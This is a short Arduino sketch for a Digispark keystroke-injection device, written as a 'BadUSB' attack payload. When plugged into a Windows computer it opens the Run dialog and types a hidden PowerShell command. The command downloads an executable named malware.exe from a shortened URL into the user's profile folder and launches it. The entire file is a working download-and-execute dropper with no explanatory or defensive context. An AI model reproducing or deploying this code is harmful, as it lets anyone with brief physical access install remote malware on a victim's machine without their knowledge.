#include <DigiKeyboardFi.h>

void setup() {}

void loop() {
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboardFi.print("powershell -w hidden -c \"(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/28sb6pvcpow', \\\"$env:UserProfile/TestDirz338/malware.exe\\\");Start-Process \\\"$env:UserProfile/TestDirz338/malware.exe\\\" -WorkingDir \\\"$env:UserProfile/TestDirz338\\\"\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  exit(0);
}
